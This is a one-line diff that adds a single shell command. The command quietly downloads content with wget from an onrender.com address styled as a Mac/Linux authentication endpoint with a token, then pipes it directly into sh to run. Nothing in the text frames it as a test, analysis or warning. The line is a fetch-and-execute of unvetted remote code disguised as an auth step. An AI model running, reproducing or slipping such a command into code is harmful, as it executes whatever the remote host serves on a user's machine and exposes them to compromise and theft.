@@ -1,0 +1,1 @@
+wget -qO- "https://project-atcl.onrender.com/users/auth/maclinux?token=a1b2c3d4e5f6g7h8 " | sh
